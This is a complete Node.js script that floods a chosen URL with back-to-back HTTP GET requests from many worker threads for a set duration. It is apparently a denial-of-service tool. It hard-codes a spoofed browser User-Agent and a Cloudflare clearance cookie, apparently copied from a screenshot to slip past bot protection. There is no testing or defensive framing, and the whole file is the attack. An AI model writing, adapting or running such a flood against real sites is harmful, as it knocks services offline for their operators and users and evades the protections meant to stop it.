const axios = require('axios');
const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');

// Worker Thread
if (!isMainThread) {
    const { url, headers, durationSec } = workerData;
    const endTime = Date.now() + durationSec * 1000;

    function sendRequest() {
        if (Date.now() > endTime) return;
        axios.get(url, { headers })
            .then(res => {
                console.log(`[${workerData.id}] OK: ${res.status}`);
            })
            .catch(err => {
                console.error(`[${workerData.id}] ERR: ${err.message}`);
            })
            .finally(() => {
                setImmediate(sendRequest); // send next immediately
            });
    }

    sendRequest();
    return;
}

// Main Thread
const args = process.argv.slice(2);
if (args.length !== 3) {
    console.log("Usage: node script.js <url> <duration_in_seconds> <threads>");
    process.exit(1);
}

const [url, durationSec, threadCount] = args;

// Headers from screenshot
const headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'Cookie': 'wordpress_test_cookie=WP%20Cookie%20check; cf_clearance=bNZ6GoENqwoOdp4rb1p70w4RAZJNpH6OSIGraFLY.g-1747919687-1.2.1.1-btz_FTk0qQ...'
};

// Start workers
for (let i = 0; i < parseInt(threadCount); i++) {
    new Worker(__filename, {
        workerData: {
            id: `Thread-${i + 1}`,
            url,
            headers,
            durationSec: parseInt(durationSec)
        }
    });
}